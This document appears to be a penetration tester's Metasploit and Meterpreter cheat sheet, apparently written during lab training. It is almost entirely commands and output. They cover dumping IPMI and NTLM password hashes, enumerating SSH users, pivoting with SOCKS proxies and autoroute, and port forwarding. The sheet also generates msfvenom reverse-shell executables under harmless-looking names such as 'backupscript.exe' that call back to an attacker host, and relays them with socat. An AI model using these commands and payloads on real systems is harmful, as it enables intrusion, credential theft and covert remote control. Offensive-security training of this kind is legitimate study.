# Modules
## IPMI Hash Dump
[IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)
```shell-session
msf> use auxiliary/scanner/ipmi/ipmi_dumphashes
```
## Local Exploit Suggestor
```shell-session
msf> use multi/recon/local_exploit_suggester
```
## SSH
### SSH User Enumeration
```metasploit
msf> use auxiliary/scanner/ssh/ssh_enumusers
```
## #SOCKS Proxy
Use Metasploit's `socks_proxy` to configure a local proxy on our attack host:
```shell-session
msf6 > use auxiliary/server/socks_proxy
```
- Enable SOCKS listener in `/etc/proxychains.conf`:
```TXT
socks4 	127.0.0.1 <PORT>
```
- Configure `socks_proxy` to route all traffic via our Meterpreter session using `post/multi/manage/autoroute`:
```shell-session
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```
- It is also possible to add routes with `autoroute`:
```shell-session
meterpreter > run autoroute -s 172.16.5.0/23
```
## Ping Sweep
```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=<REMOTER-IP>/23
```
# Meterpreter
## Dump NTLM hashes
```shell-session
meterpreter> load kiwi
meterpreter> lsa_dump_sam
```
## Port Forwarding
We can use any of the below methods to establish local port forwarding
### 1. Using [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/)
1. Create Payload for Ubuntu pivot host
```shell-session
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> -f elf -o backupjob LPORT=8080
```
2. Start a `multi/handler`, also known as a Generic Payload Handler
```shell-session
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```
3. Copy binary to Ubuntu pivot host and execute to gain a Meterpreter session
4. Now we can perform enumeration scans through this pivot host
```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
### 2. Using [[#SOCKS Proxy]]
If host's firewall blocks ICMP, we can perform TCP scan on remoter `172.16.5.0/23` IP range with Nmap. And instead of using SSH for port forwarding we can:
1. Use Metasploit `socks_proxy` to configure a local proxy on our attack host:
```shell-session
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version <4a/5>
msf6 auxiliary(server/socks_proxy) > run
```
2. Enable SOCKS listener in `/etc/proxychains.conf`:
```TXT
socks4 	127.0.0.1 9050
```
3. Configure `socks_proxy` to route all traffic via our Meterpreter session using `post/multi/manage/autoroute`:
```shell-session
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```
- It is also possible to add routes with `autoroute`:
```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```
- Now we can run any `COMMAND` via proxychains to route it via our Meterpreter session.
```shell-session
$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
>Try using with **sudo** if doesn't relay
### 3. Using `portfwd`
```shell-session
meterpreter > portfwd add -l <PORT> -p 3389 -r 172.16.5.19
[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```
With this we can simply run any command on `<PORT>` to direct it to port 3389 on remote system.
```shell-session
$ xfreerdp /v:localhost:<PORT> /u:victor /p:pass@123
```
## Reverse Port Forwarding
We can listen on any remote port and forward its received data to our local port using the below methods.
### 1. Using `portfwd`
Create a reverse port forwarding from remote pivot
```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L <ATTACKER-IP>
[*] Local TCP relay created: <ATTACKER-IP>:8081 <-> :1234
```
Now to execute commands on remoter Windows system and receive it on our attacking system:
1. Configure & start multi/handler: 
```shell-session
meterpreter > bg
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > run
```
2. Create payload for remoter Windows system to receive a connection back to pivot Ubuntu system:
```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PIVOT-IP> -f exe -o backupscript.exe LPORT=1234
```
- Executing the payload on remoter Windows system should give us a shell back.
### 2. Using [[Socat]]
#### - Reverse Shell
1. Start a reverse port forwarding from `Ubuntu:8080` to `Kali:80`
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:<ATTACKER-IP>:80
```
2. Create the Windows payload again and [[File Transfer|transfer]] it to Windows system:
```shell-session
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
3. Configure & start multi/handler: 
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
msf6 exploit(multi/handler) > run
```
- Executing the payload on remoter Windows system should give us a shell back.
#### - Bind Shell
Similar to above:
1. Use [[Socat#Redirecting with a Bind Shell|Socat's - Bind Shell Listener]]:
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:<REMOTER-IP>:8443
```
2. Create respective bind payload:
```shell-session
$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
3. Configure & start multi/handler:
```shell-session
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST <UBUNTU-IP>
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```